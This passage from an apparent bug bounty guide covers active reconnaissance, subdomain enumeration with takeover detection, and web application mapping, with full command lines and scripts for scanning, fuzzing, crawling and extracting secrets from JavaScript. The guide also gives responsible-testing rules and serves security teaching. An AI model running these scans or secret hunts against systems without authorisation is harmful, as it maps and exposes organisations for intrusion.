- https://www.example.com [200] [Main Site] [WordPress,PHP,Apache]
- https://api.example.com [200] [API] [Express,Node.js]
- https://dev.example.com [200] [Dev Server] [React,nginx] ← INTERESTING
- https://admin.example.com [403] [Admin Panel] ← INTERESTING
- https://shop.example.com [200] [Store] [Shopify]

## Open Ports (naabu/nmap results)
- api.example.com: 80, 443, 8080 (HTTP-alt exposed)
- dev.example.com: 80, 443, 3000 (Node.js on 3000 — likely dev server)
- db.example.com: 80, 443, 3306 (MySQL exposed!) ← CRITICAL

## Technologies Identified
- Web servers: Apache 2.4, nginx/1.18.0
- Languages: PHP 7.4, Node.js 16
- Frameworks: WordPress 6.1, Express.js
- CDN: Cloudflare on www.example.com and shop.example.com
- No WAF detected on dev.example.com ← TEST HEAVILY

## Content Discovery Findings
- /robots.txt: Disallows /admin, /internal-api, /staff-portal
- /api/docs: [200] Swagger UI found — 47 documented endpoints
- /actuator/env: [200] Spring Boot actuator exposed ← CRITICAL
- /.env: [403] File exists but blocked (try bypass techniques)
- /.git/HEAD: [200] Git repository exposed on dev.example.com

## DNS Brute-Force New Findings
- internal.example.com [resolves] ← Not found in passive recon
- staging.example.com [resolves] ← Staging environment found

## Priority Targets for Manual Testing
1. dev.example.com:3000 — no WAF, likely no auth hardening
2. /actuator/env on api.example.com — may leak credentials
3. MySQL on db.example.com — internet-exposed database
4. /api/docs — 47 endpoints to test systematically
5. internal.example.com — newly discovered, untested
```

---

## Responsible Active Recon

Always apply these rules during active reconnaissance:

```
✓ Stay within defined scope
✓ Rate-limit all tools (httpx -rl 50, nuclei -rate-limit 30, ffuf -rate 100)
✓ Avoid scanning at maximum speed — it can cause unintended DoS
✓ Do not scan explicitly out-of-scope assets even if you discover their IPs
✓ Stop immediately if you accidentally access private data
✓ Do not login to third-party services with credentials you find (report them)
✓ If you find an exposed database, document it without querying data

✗ Never run nmap -T5 (paranoid aggressive speed) against production targets
✗ Never use --flood or DoS-style options
✗ Never brute-force login pages with thousands of attempts (check rate limiting gently)
✗ Never test on mobile apps or other platforms unless explicitly in scope
```

---

## Summary

Active reconnaissance builds on passive recon by directly interacting with the target. The workflow moves from DNS resolution through port scanning, service fingerprinting, virtual host discovery, DNS brute-forcing, and content discovery. Key findings include exposed databases on non-standard ports, development servers without WAFs, Git repositories, Spring Boot actuators, and admin panels discovered through fuzzing. Every active recon step should be rate-limited and scoped carefully. The organized output — a structured list of live hosts, open ports, technologies, and interesting findings — becomes the map for all subsequent vulnerability testing.

---

## Checklist

- [ ] Resolved all passive recon subdomains with dnsx — identified live hosts with A records
- [ ] Extracted unique IPs and verified they belong to the target organization (WHOIS)
- [ ] Port scanned all live hosts for common service ports (80, 443, 8080, 8443, 3000, 3306, 5432, 6379, 8888, 9200, 27017)
- [ ] Ran nmap service version detection (`-sV`) on open ports
- [ ] Identified the technology stack using whatweb and httpx tech-detect
- [ ] Checked for virtual hosts on all resolved IPs
- [ ] Ran DNS brute-force with a top-5000 subdomain wordlist
- [ ] Checked for Git repository exposure (`.git/HEAD`)
- [ ] Checked for `.env`, `robots.txt`, `sitemap.xml`, and common sensitive paths
- [ ] Ran ffuf directory discovery on all live hosts
- [ ] Ran technology-specific checks (WordPress, Spring Boot Actuator, GraphQL) where applicable
- [ ] Checked for WAF presence on all hosts
- [ ] Documented all findings in a structured active recon summary
- [ ] Rate-limited all tools appropriately
- [ ] Did not scan out-of-scope assets

# Chapter 13: Subdomain Enumeration

## Objective

Systematically discover all subdomains of the target — expanding the attack surface for testing. Subdomains often run different applications with different security postures.

## Prerequisites

Chapters 10-12 complete.

## Terminology

|Term|Definition|
|---|---|
|**Subdomain**|A domain that is part of a larger domain (e.g., `app.example.com`)|
|**Wildcard DNS**|When `*.example.com` resolves to an IP (any subdomain resolves)|
|**DNS Brute-forcing**|Trying a list of common subdomain names to see which ones exist|
|**Subdomain Takeover**|When an abandoned subdomain can be claimed by an attacker|
|**DNS Zone Transfer**|A DNS feature that can reveal all records (often disabled)|
|**Permutation**|Creating variations of known subdomains to find related ones|

## Theory

### Why Subdomains Matter

A large organization may have hundreds or thousands of subdomains. Each one is a separate attack surface:

- `api.example.com` might run an older API version
- `dev.example.com` might be a development server with debugging enabled
- `admin.example.com` might be an internal tool accidentally exposed
- `old.example.com` might run unpatched legacy software

The main `www.example.com` might be locked down tight, while a forgotten `legacy.example.com` is completely unprotected.

### Subdomain Enumeration Methods

**Three main approaches:**

1. **Passive:** Using third-party data sources that already know the subdomains
2. **Active (brute-force):** Trying common names against DNS
3. **Permutation:** Generating variations of known subdomains

### Tool 1: subfinder (Best for Passive)

Subfinder queries dozens of data sources simultaneously:

- Certificate transparency logs (crt.sh, certspotter)
- DNS datasets
- Web archives
- Search engines
- Various APIs

```bash
# Basic usage
subfinder -d example.com

# Save output to file
subfinder -d example.com -o subdomains.txt

# Verbose output (shows which sources found what)
subfinder -d example.com -v

# Only use specific sources
subfinder -d example.com -sources shodan,certspotter,crtsh

# Silent mode (only output, no banner)
subfinder -d example.com -silent

# Multiple domains
subfinder -dL domains_list.txt -o all_subdomains.txt
```

**Configure API keys for more sources:** Create `~/.config/subfinder/provider-config.yaml`:

```yaml
shodan:
  - your_shodan_api_key
censys:
  - censys_api_id:censys_api_secret
securitytrails:
  - your_key
```

### Tool 2: amass (Most Comprehensive)

Amass is slower but more thorough — it performs active DNS resolution, scrapes, and uses many passive sources.

```bash
# Passive enumeration only (safest, no target interaction)
amass enum -passive -d example.com -o amass_passive.txt

# Active enumeration (includes brute-force and permutation)
amass enum -active -d example.com -o amass_active.txt

# Just run the brute-force
amass enum -brute -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# Visualize the network graph
amass viz -d3 -o graph.html -db /path/to/amass/database
```

### Tool 3: assetfinder (Fast and Simple)

```bash
# Basic usage
assetfinder example.com

# Only show subdomains of the target (not related domains)
assetfinder --subs-only example.com

# Save to file
assetfinder --subs-only example.com > assetfinder_results.txt
```

### Tool 4: DNS Brute-Force with dnsx and a wordlist

Even after passive enumeration, brute-forcing with a good wordlist often finds additional subdomains.

```bash
# Generate candidates using a wordlist
# Using ffuf for DNS brute-force
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://FUZZ.example.com \
     -mc 200,301,302,403 \
     -o ffuf_subdomains.txt

# Using dnsx to resolve a list
cat candidate_subdomains.txt | dnsx -silent -a -resp

# Better: generate the list first, then resolve
# Generate: prefix every word with the domain
cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | \
  awk '{print $1".example.com"}' > candidates.txt

# Resolve
cat candidates.txt | dnsx -silent -a -resp > resolved_subdomains.txt
```

### Combining Results and Probing

After gathering subdomains from multiple sources, combine them:

```bash
# Combine all results
cat subfinder_results.txt amass_passive.txt assetfinder_results.txt | sort -u > all_subdomains.txt

# Remove wildcards and clean up
grep -v "^\*" all_subdomains.txt | sort -u > clean_subdomains.txt

# Check which ones are alive (respond to HTTP/HTTPS)
cat clean_subdomains.txt | httpx -silent -mc 200,301,302,403,404 > alive_subdomains.txt

# Get status codes for each
cat clean_subdomains.txt | httpx -silent -sc -title > subdomains_with_info.txt
```

### httpx — Probing HTTP Services

httpx is essential for checking which subdomains are actually serving web content:

```bash
# Check which hosts respond
cat subdomains.txt | httpx -silent

# Include status codes and page titles
cat subdomains.txt | httpx -silent -sc -title -cl

# Follow redirects
cat subdomains.txt | httpx -silent -follow-redirects

# Check for specific technologies
cat subdomains.txt | httpx -silent -tech-detect

# Output to file
cat subdomains.txt | httpx -silent -sc -title -o alive.txt

# JSON output for processing
cat subdomains.txt | httpx -silent -json -o results.json
```

**Output columns:** `-sc` (status code), `-title` (page title), `-cl` (content length), `-tech` (technology)

### Subdomain Takeover Detection

A subdomain takeover occurs when a subdomain points to a service (like GitHub Pages, AWS S3, Heroku) that no longer has a corresponding account. An attacker can register that service and take control of the subdomain.

**How it happens:**

1. Developer creates `app.example.com` → points to `someapp.herokuapp.com`
2. Developer deletes the Heroku app but forgets to remove the DNS record
3. `app.example.com` now returns a Heroku "No such app" error
4. Attacker registers `someapp.herokuapp.com` on Heroku
5. Now `app.example.com` is under the attacker's control

**Detection:**

```bash
# Check for takeover indicators manually
curl -s https://subdomain.example.com | grep -i "heroku\|github\|amazonaws\|no such\|not found"

# Automated detection with nuclei
cat alive_subdomains.txt | nuclei -t ~/nuclei-templates/takeovers/

# Or use subjack
go install github.com/haccer/subjack@latest
subjack -w subdomains.txt -t 100 -timeout 30 -o subjack_results.txt -ssl
```

**Services commonly vulnerable to takeover:**

- GitHub Pages
- Amazon S3 / CloudFront
- Heroku
- Azure (various services)
- Shopify
- Zendesk
- Fastly

### Complete Subdomain Enumeration Workflow

```bash
#!/bin/bash
TARGET="example.com"
OUTPUT_DIR="$HOME/bugbounty/targets/$TARGET/recon"
mkdir -p $OUTPUT_DIR

echo "[*] Starting subdomain enumeration for $TARGET"

# Passive enumeration
echo "[*] Running subfinder..."
subfinder -d $TARGET -silent -o $OUTPUT_DIR/subfinder.txt

echo "[*] Running assetfinder..."
assetfinder --subs-only $TARGET > $OUTPUT_DIR/assetfinder.txt

echo "[*] Querying crt.sh..."
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
  jq -r '.[].name_value' | \
  sed 's/\*\.//g' | \
  sort -u > $OUTPUT_DIR/crtsh.txt

# Combine all results
echo "[*] Combining results..."
cat $OUTPUT_DIR/subfinder.txt \
    $OUTPUT_DIR/assetfinder.txt \
    $OUTPUT_DIR/crtsh.txt | \
    sort -u > $OUTPUT_DIR/all_subdomains.txt

echo "[*] Total unique subdomains: $(wc -l < $OUTPUT_DIR/all_subdomains.txt)"

# Probe for alive hosts
echo "[*] Probing for alive hosts..."
cat $OUTPUT_DIR/all_subdomains.txt | \
  httpx -silent -sc -title -o $OUTPUT_DIR/alive_subdomains.txt

echo "[*] Alive hosts: $(wc -l < $OUTPUT_DIR/alive_subdomains.txt)"

echo "[*] Done. Results in $OUTPUT_DIR"
```

## Summary

Subdomain enumeration is one of the highest-return-on-investment reconnaissance activities. Passive tools like subfinder and assetfinder gather information without touching the target. Active brute-forcing with good wordlists finds additional subdomains. httpx probes which are alive. The wider your attack surface, the more opportunities you have to find vulnerabilities. Always check for subdomain takeovers.

## Checklist

- [ ] subfinder installed and configured with API keys
- [ ] amass installed
- [ ] assetfinder installed
- [ ] httpx installed
- [ ] CT log query complete
- [ ] All passive sources queried and results combined
- [ ] Duplicate results removed (sort -u)
- [ ] Alive subdomains identified with httpx
- [ ] Results saved in organized directory structure
- [ ] Checked for subdomain takeover indicators

---

# Chapter 14: Web Application Mapping

## Objective

Build a complete, structured map of a target web application — every page, endpoint, parameter, form, and functionality — before any vulnerability testing begins. You cannot find vulnerabilities in features you do not know exist.

## Prerequisites

Chapters 10–13 complete. You should have a list of alive subdomains and a general understanding of the target's technology stack.

## Terminology

|Term|Definition|
|---|---|
|**Attack Surface**|The total set of entry points through which an attacker could try to enter or extract data|
|**Endpoint**|A specific URL path that the application listens on and responds to|
|**Parameter**|A variable passed to an endpoint (via URL, form, or JSON body)|
|**Crawling**|Automatically following links throughout an application to discover content|
|**Spidering**|A synonym for crawling — following links to map all reachable pages|
|**Fuzzing (directories)**|Trying a wordlist of path names to discover hidden or unlisted endpoints|
|**Content Discovery**|Finding pages and files that are not linked from anywhere in the application|
|**JavaScript Analysis**|Reading client-side JS files to extract hidden endpoints, parameters, and logic|
|**API Endpoint**|A URL that accepts and returns structured data (usually JSON) rather than HTML|
|**Authentication State**|Whether you are testing as an unauthenticated user, a regular user, or an admin|
|**Sitemap**|A file (often `/sitemap.xml`) that lists the pages of a website, intended for search engines|
|**robots.txt**|A file at the root of a domain that instructs search engine bots what not to index — often reveals hidden paths|

---

## Theory

### Why Mapping Comes Before Testing

Beginners make one of two mistakes: they pick a URL at random and immediately start throwing payloads at it, or they spend so long on reconnaissance that they never test anything. Web application mapping is the structured middle ground.

The goal is to answer these questions before touching a single form field with a payload:

- What does this application actually _do_?
- Where are all the places it accepts user input?
- What does it look like when you are logged out, logged in as a regular user, and logged in as an admin?
- Are there any endpoints that should be hidden but are not?
- What API calls is the JavaScript making in the background?

A thorough map turns a large, intimidating application into a checklist of specific things to test.

### The Four Layers of an Application's Attack Surface

Think of a web application as having four layers of entry points:

```
┌─────────────────────────────────────────────────────┐
│  LAYER 1: VISIBLE SURFACE                           │
│  Pages you can see and interact with as a user      │
│  (forms, buttons, links, file uploads)              │
├─────────────────────────────────────────────────────┤
│  LAYER 2: HIDDEN CONTENT                            │
│  Paths that exist but are not linked anywhere       │
│  (/admin, /backup, /api/internal, /.git)            │
├─────────────────────────────────────────────────────┤
│  LAYER 3: API LAYER                                 │
│  Background requests made by JavaScript             │
│  (REST API calls, GraphQL queries, WebSocket msgs)  │
├─────────────────────────────────────────────────────┤
│  LAYER 4: STATE-DEPENDENT SURFACE                   │
│  Content only accessible after login, or only to   │
│  certain roles (admin panels, account settings)     │
└─────────────────────────────────────────────────────┘
```

Incomplete mapping means untested attack surface. Every layer must be explored.

---

### Step 1: Check the Obvious Files First

Before any crawling or fuzzing, two files on every domain may hand you a map of interesting paths for free.

**`robots.txt`** — Designed to tell search engines what _not_ to crawl. Developers often put their most sensitive paths here.

```bash
curl https://example.com/robots.txt
```

Example output that should immediately catch your eye:

```
User-agent: *
Disallow: /admin/
Disallow: /internal-api/
Disallow: /staff-portal/
Disallow: /backup/
Disallow: /dev/
```

Every `Disallow` entry is a path worth visiting manually.

**`sitemap.xml`** — Lists all pages the site wants indexed. A comprehensive sitemap can give you dozens of endpoints instantly.

```bash
curl https://example.com/sitemap.xml
curl https://example.com/sitemap_index.xml   # Sometimes a master index
```

Also try common variations:

```bash
curl https://example.com/sitemap.xml
curl https://example.com/sitemap1.xml
curl https://example.com/news-sitemap.xml
curl https://example.com/page-sitemap.xml
```

---

### Step 2: Manual Browsing with Burp Suite Proxy

Before running any automated tool, browse the application manually with Burp Suite's proxy enabled. This accomplishes three things:

1. You see the application the way a user sees it
2. Every request is captured in Burp's HTTP history
3. You understand the application's purpose and logic — essential context for finding business logic vulnerabilities later

**What to do during manual browsing:**

- Visit every page you can find by clicking links
- Register an account (if in scope and a test account is appropriate)
- Log in and explore every authenticated feature
- Fill out every form and submit it (use harmless test values for now)
- Upload a file if there is an upload feature
- Change your account settings, email, password
- Look at error messages — they often reveal technology, paths, and server details
- Use the application as an attacker would _pretend_ to be a normal user

**In Burp Suite:**

After browsing, go to `Target → Site Map`. Burp builds a tree of every URL it has seen. Right-click the target domain and select `Engagement tools → Discover content` to kick off Burp's own discovery.

---

### Step 3: Automated Crawling

Automated crawlers follow every link they can find, building a map of reachable content.

**Tool: Katana (recommended for modern applications)**

Katana is a fast, modern crawler built for bug bounty reconnaissance. It handles JavaScript-heavy single-page applications (SPAs) better than older tools.

```bash
# Install
go install github.com/projectdiscovery/katana/cmd/katana@latest

# Basic crawl
katana -u https://example.com

# Save output
katana -u https://example.com -o katana_results.txt

# Headless mode (executes JavaScript — essential for SPAs)
katana -u https://example.com -headless

# Crawl multiple URLs
katana -list alive_subdomains.txt -o crawl_results.txt

# Increase depth (default is 3)
katana -u https://example.com -depth 5

# Extract endpoints from JavaScript files automatically
katana -u https://example.com -js-crawl

# Full recommended command
katana -u https://example.com \
       -depth 5 \
       -headless \
       -js-crawl \
       -silent \
       -o katana_output.txt
```

**Tool: Gospider**

```bash
go install github.com/jaeles-project/gospider@latest

# Basic crawl
gospider -s https://example.com -o gospider_output/

# Follow redirects, 10 concurrent threads, depth 5
gospider -s https://example.com \
         -c 10 \
         -d 5 \
         --other-source \   # Also checks Wayback Machine, CommonCrawl
         -o gospider_output/
```

**Combining crawler output:**

```bash
cat katana_output.txt gospider_output/*.txt | sort -u > all_crawled_urls.txt

# Filter for interesting paths only
grep -E "\.(php|asp|aspx|jsp|json|xml|conf|bak|sql|env)$" all_crawled_urls.txt > interesting_files.txt

# Filter for URLs with parameters (common injection points)
grep "?" all_crawled_urls.txt | sort -u > parameterized_urls.txt
```

---

### Step 4: Directory and File Fuzzing (Content Discovery)

Crawlers only find what is linked. Content discovery finds what is _not_ linked — hidden admin panels, backup files, configuration files, old API versions.

**Tool: ffuf (Fast Web Fuzzer)**

```bash
# Basic directory fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://example.com/FUZZ

# Include status codes to show (exclude 404)
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://example.com/FUZZ \
     -mc 200,301,302,403,500

# Recursively fuzz discovered directories
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://example.com/FUZZ \
     -recursion \
     -recursion-depth 3 \
     -mc 200,301,302,403

# Fuzz with file extensions
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://example.com/FUZZ \
     -e .php,.html,.js,.json,.txt,.bak,.zip,.conf,.env \
     -mc 200,301,302,403

# Output results to file
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
     -u https://example.com/FUZZ \
     -mc 200,301,302,403 \
     -o ffuf_results.json \
     -of json

# Filter by response size to remove false positives
# First run without filter to see baseline 404 size
ffuf -w wordlist.txt -u https://example.com/FUZZ -mc all -fs 1234
#                                                              ^
#                                   Replace 1234 with your 404 page size
```

**Recommended wordlists (from SecLists):**

|Wordlist|Use case|
|---|---|
|`Discovery/Web-Content/common.txt`|Fast initial scan|
|`Discovery/Web-Content/directory-list-2.3-medium.txt`|Thorough general scan|
|`Discovery/Web-Content/raft-large-files.txt`|File discovery|
|`Discovery/Web-Content/api/api-endpoints.txt`|API endpoint discovery|
|`Discovery/Web-Content/big.txt`|Large, comprehensive scan|

**Interesting findings to note immediately:**

|Path|Why it matters|
|---|---|
|`/.git/`|Exposed Git repository — source code leak|
|`/.env`|Environment file — may contain secrets and credentials|
|`/backup/`, `/bak/`|Backup files — old versions, config files|
|`/admin/`, `/administrator/`|Admin interface|
|`/api/v1/`, `/api/v2/`|API versions — older ones often less secure|
|`/swagger.json`, `/api-docs`|API documentation — reveals all endpoints|
|`/phpinfo.php`|PHP configuration info — technology exposure|
|`/server-status`|Apache server status|
|`/.DS_Store`|macOS metadata — reveals directory structure|
|`/config.json`, `/config.yml`|Configuration files|

---

### Step 5: JavaScript Analysis

Modern web applications do much of their work in JavaScript running in the browser. These JS files often contain:

- Hidden API endpoints not visible in the HTML
- Parameter names
- Authentication tokens (hardcoded — a vulnerability in itself)
- Internal hostnames and IP addresses
- Business logic that reveals how the backend works

**Finding JavaScript files:**

```bash
# From your crawl results
grep "\.js$" all_crawled_urls.txt | grep -v "node_modules\|jquery\|bootstrap" > js_files.txt

# With gau (Get All URLs) for historical JS files
gau example.com | grep "\.js$" | sort -u >> js_files.txt
```

**Tool: LinkFinder — extract endpoints from JS**

```bash
pip install linkfinder --break-system-packages

# Analyze a single JS file
python3 linkfinder.py -i https://example.com/static/app.js -o cli

# Analyze all JS files from a list
while read url; do
    python3 linkfinder.py -i "$url" -o cli 2>/dev/null
done < js_files.txt | sort -u > js_endpoints.txt
```

**Tool: SecretFinder — find secrets in JS**

```bash
git clone https://github.com/m4ll0k/SecretFinder
cd SecretFinder
pip3 install -r requirements.txt --break-system-packages

# Scan a JS file for secrets (API keys, tokens, credentials)
python3 SecretFinder.py -i https://example.com/static/app.js -o cli
```

**Manual JS review — what to look for:**

Open JS files in the browser (View Source or DevTools → Sources tab) and search for:

```
/api/          # API endpoints
fetch(          # Network requests
axios.          # Network requests (axios library)
XMLHttpRequest  # Old-style network requests
localStorage    # Client-side storage (may contain tokens)
apiKey          # Hardcoded keys
password        # Hardcoded credentials
secret          # Hardcoded secrets
token           # Authentication tokens
Authorization   # Auth headers
```

---

### Step 6: Mapping API Endpoints

APIs deserve their own mapping pass. They often have entirely different authentication, validation, and access control logic from the HTML application.

**Where to find API documentation:**

```bash
# Common documentation paths
/api-docs
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/v1/api-docs
/api/v1/swagger.json
/docs
/redoc
```

```bash
# Fuzz for common API paths
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://api.example.com/FUZZ \
     -mc 200,201,204,301,302,400,401,403

# Try versioning patterns
ffuf -w <(echo -e "v1\nv2\nv3\nv4\napi\napi/v1\napi/v2") \
     -u https://example.com/FUZZ/users \
     -mc 200,401,403
```

**If Swagger/OpenAPI documentation is found:**

This is a jackpot. The documentation lists every endpoint, every parameter, and every data type the API accepts. Import it into Burp Suite:

`Burp Suite → Target → Import OpenAPI Definition`

This automatically populates your Site Map with every documented endpoint.

**Watching network traffic with DevTools:**

For APIs that have no public documentation, the browser's Network tab shows every request the application makes:

1. Open DevTools (`F12`)
2. Go to the Network tab
3. Filter by `Fetch/XHR` to see API calls only
4. Use every feature of the application
5. Each API call appears — note the URL, method, headers, and request body
6. Right-click any request → "Copy as cURL" to replay it in the terminal or Burp Suite

---

### Step 7: Authentication State Mapping

Many vulnerabilities only appear when you compare what different users can access. Map the application in at least two states:

**Unauthenticated:**

- Which pages can you access without logging in?
- Does the application redirect you away from restricted pages, or does it show an error?
- What does the login, registration, and password-reset flow look like?

**Authenticated (regular user):**

- What new pages and features are now accessible?
- What does your session token look like (cookie name, format)?
- Are there any references to admin-only pages?

**If multiple roles exist (e.g., admin, moderator, regular user):**

Create test accounts for each role. Map what each role can access. The gaps between roles are where access control vulnerabilities hide.

```
Unauthenticated user  →  can access: /login, /register, /about
Regular user          →  can access: /dashboard, /profile, /settings
Admin user            →  can access: /admin, /admin/users, /admin/reports
```

Now ask: _Can a regular user access `/admin` if they just request it directly?_ That is a Broken Access Control vulnerability — and it only becomes visible when you have mapped the difference between roles.

---

### Step 8: Parameter Discovery

Parameters are the primary injection point for most vulnerability classes. Finding every parameter the application accepts is essential.

**URL parameters (visible in the address bar):**

```
https://example.com/product?id=42&category=shoes&sort=price
                             ^        ^                ^
                     These are all parameters to test
```

Collect all unique parameters from your crawl:

```bash
# Extract all parameters from collected URLs
cat all_crawled_urls.txt | grep "?" | \
  sed 's/.*?//' | \
  tr '&' '\n' | \
  sed 's/=.*//' | \
  sort -u > all_parameters.txt
```

**Tool: Arjun — find hidden parameters**

Some parameters are not in the visible URL but are accepted by the application if supplied. Arjun brute-forces parameter names:

```bash
pip install arjun --break-system-packages

# Scan a single URL for hidden GET parameters
arjun -u https://example.com/api/users

# Scan for POST parameters
arjun -u https://example.com/api/users -m POST

# Scan multiple URLs
arjun --urls parameterized_urls.txt

# Use a larger wordlist
arjun -u https://example.com/profile -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

---

### Organizing Your Map

A good application map is a reference document you use throughout all subsequent testing. Use this structure:

```markdown
# Application Map: example.com
## Date: 2026-XX-XX

## Technology Stack
- Frontend: React SPA
- Backend: Node.js / Express
- Database: PostgreSQL (inferred from error messages)
- CDN: Cloudflare
- Auth: JWT tokens (Bearer header)

## Authentication
- Login: POST /api/auth/login  { email, password }
- Register: POST /api/auth/register
- Password reset: POST /api/auth/forgot-password
- Token: JWT in Authorization header + httpOnly cookie

## Roles Identified
- [x] Unauthenticated
- [x] Regular user (account created)
- [ ] Admin (no test account available)

## Endpoints by Category

### Public (No Auth Required)
| Method | Path | Parameters | Notes |
|---|---|---|---|
| GET | / | — | Homepage |
| GET | /products | category, sort, page | Product listing |
| GET | /products/:id | — | Product detail |
| POST | /api/auth/login | email, password | Returns JWT |
| POST | /api/auth/register | name, email, password | |

### Authenticated - Regular User
| Method | Path | Parameters | Notes |
|---|---|---|---|
| GET | /dashboard | — | User dashboard |
| GET | /api/user/profile | — | Own profile |
| PUT | /api/user/profile | name, bio, avatar_url | ← Test for mass assignment |
| DELETE | /api/user/account | — | Account deletion |
| GET | /api/orders | page, limit | Order history |
| GET | /api/orders/:id | — | ← Test IDOR here |

### Potentially Admin (Discovered via JS/Fuzzing)
| Method | Path | Parameters | Notes |
|---|---|---|---|
| GET | /admin | — | Returns 403 for regular user |
| GET | /api/admin/users | — | Returns 401 |
| DELETE | /api/admin/users/:id | — | ← Test for access control bypass |

## Interesting Findings During Mapping
- `robots.txt` disallows `/admin`, `/internal`, `/staff`
- Swagger docs found at `/api-docs` — 47 endpoints documented
- JS file `app.bundle.js` contains references to `/api/v1/` and `/api/v2/`
- `/api/v1/users` returns 200 (v1 appears to still be active despite v2 existing)
- No CSP header on any response
- `X-Powered-By: Express` header visible — version not disclosed

## Files of Interest
- `/.env` → 403 (exists but blocked — worth revisiting)
- `/backup/` → 404
- `/phpinfo.php` → 404
- `/api-docs` → 200 ← Swagger UI found
```

---

### Complete Mapping Workflow Script

```bash
#!/bin/bash
TARGET="example.com"
DIR="$HOME/bugbounty/targets/$TARGET"
mkdir -p $DIR/{recon,mapping,js,params}

echo "[*] === WEB APPLICATION MAPPING: $TARGET ==="

# Step 1: Check obvious files
echo "[*] Fetching robots.txt and sitemap..."
curl -s https://$TARGET/robots.txt > $DIR/mapping/robots.txt
curl -s https://$TARGET/sitemap.xml > $DIR/mapping/sitemap.xml

# Step 2: Crawl with katana
echo "[*] Crawling with katana..."
katana -u https://$TARGET -depth 5 -js-crawl -silent \
       -o $DIR/mapping/katana.txt

# Step 3: Directory fuzzing with ffuf
echo "[*] Fuzzing directories..."
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
     -u https://$TARGET/FUZZ \
     -mc 200,301,302,403 \
     -silent \
     -o $DIR/mapping/ffuf_dirs.json \
     -of json

# Step 4: File fuzzing (common extensions)
echo "[*] Fuzzing for sensitive files..."
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
     -u https://$TARGET/FUZZ \
     -mc 200,301,302,403 \
     -silent \
     -o $DIR/mapping/ffuf_files.json \
     -of json

# Step 5: Extract URLs with parameters
echo "[*] Extracting parameterized URLs..."
cat $DIR/mapping/katana.txt | grep "?" | sort -u > $DIR/params/parameterized_urls.txt
echo "[*] Parameterized URLs: $(wc -l < $DIR/params/parameterized_urls.txt)"

# Step 6: Extract JS files
echo "[*] Collecting JavaScript files..."
cat $DIR/mapping/katana.txt | grep "\.js$" | sort -u > $DIR/js/js_files.txt
echo "[*] JS files found: $(wc -l < $DIR/js/js_files.txt)"

# Step 7: Extract endpoints from JS
echo "[*] Extracting endpoints from JavaScript..."
while read url; do
    python3 ~/tools/LinkFinder/linkfinder.py -i "$url" -o cli 2>/dev/null
done < $DIR/js/js_files.txt | sort -u > $DIR/js/js_endpoints.txt

# Done
echo ""
echo "[*] === MAPPING COMPLETE ==="
echo "[*] All URLs:          $(wc -l < $DIR/mapping/katana.txt)"
echo "[*] Parameterized:     $(wc -l < $DIR/params/parameterized_urls.txt)"
echo "[*] JS files:          $(wc -l < $DIR/js/js_files.txt)"
echo "[*] JS endpoints:      $(wc -l < $DIR/js/js_endpoints.txt)"
echo "[*] Results in:        $DIR"
```

---

## Mental Model

Think of web application mapping like casing a building before testing its security:

- **Manual browsing** = walking around the outside and through the front door as a visitor
- **robots.txt / sitemap** = reading the building's own directory posted in the lobby
- **Directory fuzzing** = trying every door and window to see which ones open
- **JS analysis** = reading the internal memos you found left on a desk
- **API mapping** = finding the service entrance and loading dock around the back
- **Authentication mapping** = doing all of the above again once you have a visitor badge

A security guard who only checks the front door misses everything else. Map everything.

---

## Summary

Web application mapping is the final reconnaissance step before active vulnerability testing begins. It combines manual browsing with automated crawling, directory fuzzing, and JavaScript analysis to build a complete picture of the application's attack surface. Robots.txt and sitemaps provide quick wins. Crawlers map linked content. Fuzzing finds unlinked content. JavaScript analysis reveals hidden API endpoints and secrets. Authentication state mapping shows what each role can access. The output — a structured map of every endpoint, parameter, and piece of functionality — becomes your testing checklist for every chapter that follows.

---

## Checklist

- [ ] `robots.txt` reviewed — noted all disallowed paths
- [ ] `sitemap.xml` retrieved and reviewed
- [ ] Manual browsing complete with Burp proxy enabled
- [ ] Burp Site Map reviewed and organized
- [ ] Katana or Gospider crawl complete
- [ ] Directory fuzzing complete with at least one medium wordlist
- [ ] File fuzzing complete (looking for `.env`, `.git`, `.bak`, etc.)
- [ ] JavaScript files collected
- [ ] LinkFinder run against JS files — endpoints extracted
- [ ] SecretFinder or manual review run against JS files — no hardcoded secrets
- [ ] API documentation checked (`/swagger.json`, `/api-docs`, etc.)
- [ ] Browser DevTools Network tab used to capture background API calls
- [ ] Arjun run against key endpoints to find hidden parameters
- [ ] All parameters collected and deduplicated
- [ ] Application mapped in at least two authentication states (logged out / logged in)
- [ ] Multiple roles mapped if applicable
- [ ] Organized mapping document created with all endpoints, methods, and parameters
- [ ] Interesting findings noted (exposed files, unusual headers, versioned APIs)

---

_End of Part Three: Reconnaissance — Continue to Part Four: Vulnerabilities_

---

# Chapter 15: Cross-Site Scripting (XSS)

## Objective

Understand every type of Cross-Site Scripting vulnerability at a deep level — how they work mechanically, how to find them systematically, how to exploit them to prove real impact, and how to write compelling reports. XSS is one of the most common vulnerabilities on the web and, when chained with other issues, can escalate to full account takeover.

## Prerequisites

Chapters 1–14 complete. You should be comfortable reading HTML, understanding how browsers parse and render pages, and using Burp Suite to intercept and replay requests.

## Terminology

|Term|Definition|
|---|---|
|**XSS**|Cross-Site Scripting — injecting malicious scripts into web pages viewed by other users|
|**Payload**|The injected code (usually JavaScript) that executes in the victim's browser|
|**Reflected XSS**|The injected script is reflected off the server immediately in the response|
|**Stored XSS**|The injected script is saved to the server and executed for every user who views it|
|**DOM-based XSS**|The injection occurs entirely in the browser via JavaScript, never reaches the server|
|**Blind XSS**|A stored XSS where you cannot see the output — it fires in a context you cannot view|
|**Sink**|In DOM XSS, a JavaScript function or property that executes or renders data unsafely|
